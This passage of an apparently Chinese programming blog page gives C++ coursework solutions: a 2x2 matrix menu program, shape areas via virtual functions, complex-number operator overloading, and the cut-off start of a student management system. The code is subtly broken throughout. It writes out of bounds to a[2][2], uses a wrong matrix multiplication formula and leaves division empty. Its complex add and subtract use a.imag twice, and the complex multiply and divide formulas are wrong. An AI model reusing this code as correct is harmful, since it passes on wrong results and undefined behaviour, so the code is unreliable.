class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Matrix</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> result[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Matrix();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">subtraction</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multiplication</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">division</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line">Matrix::Matrix()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    a[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">b[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">result[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入矩阵A:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i][j];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入矩阵B:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;b[i][j];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"你输入的矩阵A为"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"你输入的矩阵B为"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;b[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::add()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"相加结果为"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j] = a[i][j]+b[i][j];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::subtraction()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"相加结果为"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j] = a[i][j]-b[i][j];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::multiplication()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j] = a[i][j]*b[i][j] + a[i][j]*b[j][i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">"  "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::division()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::transpose()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A转置为:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j]=a[j][i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"B转置为:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j]=b[j][i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> h;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"-------------------"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":        菜单      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      1.加法      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      2.减法      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      3.乘法      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      4.除法      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      5.转置      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      0.退出      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"-------------------"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入要进行的操作"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt;h;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">switch</span>(h)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.subtraction();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.multiplication();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.division();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.transpose();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"退出成功"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>: <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入错误"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目二-求不同图形面积"><a href="#题目二-求不同图形面积" class="headerlink" title="题目二  求不同图形面积"></a>题目二  求不同图形面积</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Graphic</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">double</span> length;</span><br><span class="line"><span class="keyword">double</span> tall;</span><br><span class="line">Graphic(<span class="built_in">string</span> s,<span class="keyword">double</span> a,<span class="keyword">double</span> b=<span class="number">0</span>):name(s),length(a),tall(b)&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span>:</span><span class="keyword">public</span> Graphic</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Square(<span class="keyword">double</span> a):Graphic(<span class="string">"Square"</span>,a)</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Square'area:"</span>&lt;&lt;length*length&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ~Square();</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span>:</span><span class="keyword">public</span> Graphic</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Circle(<span class="keyword">double</span> a):Graphic(<span class="string">"Circle"</span>,a)&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Circle'area:"</span>&lt;&lt;length*length*<span class="number">3.14</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">triangle</span>:</span><span class="keyword">public</span> Graphic</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">triangle(<span class="keyword">double</span> a,<span class="keyword">double</span> b):Graphic(<span class="string">"Circle"</span>,a,b)&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//double i</span></span><br><span class="line">        <span class="comment">//i =</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"triangle'area:"</span>&lt;&lt;(length*tall)/<span class="number">2</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Graphic *gp;</span><br><span class="line"><span class="built_in">string</span> type;  <span class="comment">// 定义图形的类型</span></span><br><span class="line"><span class="keyword">double</span> value;</span><br><span class="line"><span class="keyword">double</span> tall;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'type"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;type;</span><br><span class="line"><span class="comment">// cout&lt;&lt;"what'value"&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">// cin&gt;&gt;value;</span></span><br><span class="line"><span class="keyword">if</span>(type==<span class="string">"Square"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'value"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;value;</span><br><span class="line">gp = <span class="keyword">new</span> Square(value);</span><br><span class="line">gp -&gt;show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(type==<span class="string">"Circle"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'value"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;value;</span><br><span class="line">gp = <span class="keyword">new</span> Circle(value);</span><br><span class="line">gp -&gt;show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(type==<span class="string">"triangle"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'value"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;value;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'tall"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;tall;</span><br><span class="line">gp = <span class="keyword">new</span> triangle(value,tall);</span><br><span class="line">gp -&gt;show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目三-运算符重载"><a href="#题目三-运算符重载" class="headerlink" title="题目三 运算符重载"></a>题目三 运算符重载</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span>&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">class <span class="built_in">Complex</span>&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="built_in">Complex</span>(double r=<span class="number">0.0</span>,double i=<span class="number">0.0</span>);</span><br><span class="line">void <span class="keyword">print</span>();</span><br><span class="line">friend <span class="built_in">Complex</span> operator+ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">friend <span class="built_in">Complex</span> operator- (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">friend <span class="built_in">Complex</span> operator* (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">friend <span class="built_in">Complex</span> operator/ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">private:</span><br><span class="line">double <span class="built_in">real</span>;</span><br><span class="line">double <span class="built_in">imag</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Complex</span>::<span class="built_in">Complex</span>(double r,double i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">real</span> = r;</span><br><span class="line"><span class="built_in">imag</span> = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator+ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">temp.<span class="built_in">real</span> = a.<span class="built_in">real</span> + b.<span class="built_in">real</span>;</span><br><span class="line">temp.<span class="built_in">imag</span> = a.<span class="built_in">imag</span> + a.<span class="built_in">imag</span>;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator- (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">temp.<span class="built_in">real</span> = a.<span class="built_in">real</span> - b.<span class="built_in">real</span>;</span><br><span class="line">temp.<span class="built_in">imag</span> = a.<span class="built_in">imag</span> - a.<span class="built_in">imag</span>;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator* (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">temp.<span class="built_in">real</span> = a.<span class="built_in">real</span> * b.<span class="built_in">real</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">imag</span>;</span><br><span class="line">temp.<span class="built_in">imag</span> = a.<span class="built_in">real</span> * b.<span class="built_in">imag</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">real</span>;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator/ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">double t;</span><br><span class="line">t = <span class="number">1</span>/(b.<span class="built_in">real</span> * b.<span class="built_in">real</span> + b.<span class="built_in">imag</span> * b.<span class="built_in">imag</span>);</span><br><span class="line">temp.<span class="built_in">real</span> = (a.<span class="built_in">real</span> * b.<span class="built_in">real</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">imag</span>)*t;</span><br><span class="line">temp.<span class="built_in">imag</span> = (b.<span class="built_in">real</span> * b.<span class="built_in">imag</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">real</span>)*t;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">void <span class="built_in">Complex</span>::<span class="keyword">print</span>()</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="built_in">real</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">imag</span>&gt;<span class="number">0</span>)</span><br><span class="line">cout&lt;&lt;<span class="string">"+"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">imag</span>!=<span class="number">0</span>)</span><br><span class="line">cout&lt;&lt;<span class="built_in">imag</span>&lt;&lt;'i'&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> A1(<span class="number">2.3</span>,<span class="number">4.6</span>),A2(<span class="number">3.6</span>,<span class="number">2.8</span>),A3,A4,A5,A6;</span><br><span class="line">A3 = A1 + A2;</span><br><span class="line">A4 = A1 - A2;</span><br><span class="line">A5 = A1 * A2;</span><br><span class="line">A6 = A1 / A2;</span><br><span class="line">A1.<span class="keyword">print</span>();</span><br><span class="line">A2.<span class="keyword">print</span>();</span><br><span class="line">A3.<span class="keyword">print</span>();</span><br><span class="line">A4.<span class="keyword">print</span>();</span><br><span class="line">A5.<span class="keyword">print</span>();</span><br><span class="line">A6.<span class="keyword">print</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="学生管理系统"><a href="#学生管理系统" class="headerlink" title="学生管理系统"></a>学生管理系统</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 